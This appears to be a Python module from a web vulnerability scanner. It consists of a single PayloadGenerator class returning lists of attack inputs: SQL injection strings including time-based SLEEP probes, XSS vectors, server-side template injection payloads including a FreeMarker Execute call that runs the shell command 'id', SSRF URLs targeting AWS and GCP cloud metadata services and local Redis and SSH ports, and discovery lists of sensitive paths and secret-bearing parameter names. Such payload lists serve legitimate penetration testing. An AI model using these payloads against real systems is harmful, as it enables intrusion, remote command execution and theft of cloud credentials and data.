class PayloadGenerator:
    @staticmethod
    def sqli():
        return ["' OR '1'='1'-- -", "' AND '1'='1'-- -", "') OR ('1'='1'-- -", "' UNION SELECT NULL-- -", "' AND SLEEP(5)-- -", "' OR SLEEP(5)-- -"]
    @staticmethod
    def xss():
        return ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "<svg/onload=alert(1)>", "javascript:alert(1)"]
    @staticmethod
    def ssti():
        return ["{{7*7}}", "{{config}}", "${7*7}", "<#assign ex='freemarker.template.utility.Execute'?new()>${ex('id')}", "#set($x=7*7) $x"]
    @staticmethod
    def ssrf():
        return ["http://169.254.169.254/latest/meta-data/", "http://metadata.google.internal/computeMetadata/v1/", "http://127.0.0.1:22", "http://127.0.0.1:6379"]
    @staticmethod
    def paths():
        return ["admin", "login", "api", "backup", ".env", ".git", "wp-admin", "phpmyadmin", "cgi-bin", "config", "test"]
    @staticmethod
    def params():
        return ["id", "q", "page", "cat", "user", "email", "password", "token", "key", "api_key", "secret", "debug", "file", "path", "url"]
